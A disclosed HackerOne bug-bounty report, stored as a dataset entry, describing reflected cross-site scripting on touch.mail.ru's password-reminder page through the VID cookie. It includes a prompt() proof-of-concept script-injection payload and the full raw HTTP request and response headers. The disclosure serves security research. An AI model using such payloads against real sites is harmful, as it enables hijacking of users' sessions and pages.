---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '107358'
original_report_id: '107358'
title: reflected in xss
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-12-29T16:48:57.707Z'
disclosed_at: '2016-02-17T19:38:17.341Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# reflected in xss

## Metadata

- HackerOne Report ID: 107358
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2016-02-17T19:38:17.341Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

hello  i found vulnerability cross site scripting  

https://touch.mail.ru


This vulnerability affects /cgi-bin/passremind. 
 
Attack details
Cookie input VID was set to 14svrC28zu5Q1MWh0r_"</script><script>prompt(979663)</script>"
The input is reflected inside <script> tag between single quotes.




Request
GET /cgi-bin/passremind HTTP/1.1
Cookie: mrcu=979B5682AFCE2FA0115A29D1BB4E; FTID=1Ekz4f1V6BXQ:1451405260:110605:::; FTID=1MWh0r1u-xLQ1MWh0r; FTID=1Ekz4f1V6BXQ:1451405260:110605:::; FTID=1Ekz4f1V6BXQ:1451405260:110605:::; guid=469F681D5682B035X1451405365; p=72QAANqnaQAA; uuid_15355=2a8f4f90-ee33-6ee6-3228-6d84447da2d0; VID=14svrC28zu5Q1MWh0r_"</script><script>prompt(979663)</script>"; VID=1EVoFG2ZgtHQ0000030614HQ::
Referer: https://touch.mail.ru:443/
Host: touch.mail.ru
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

Response
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 29 Dec 2015 16:12:09 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Pragma: no-cache
Cache-Control: no-cache, no-store
Expires: Tue, 29 Dec 2015 16:12:09 GMT
Frontend-key: 94.100.178.218
P3P: policyref="/w3c/p3p.xml", CP="NON CUR ADM DEV PSA PSD OUR IND UNI NAV INT STA"
X-Frame-Options: SAMEORIGIN
X-Host: f243.i.mail.ru
X-XSS-Protection: 1; mode=block; report=https://cspreport.mail.ru/xxssprotection
X-ETime: 0.031
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=16070400; includeSubDomains; preload
Original-Content-Encoding: gzip
Content-Length: 57428

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
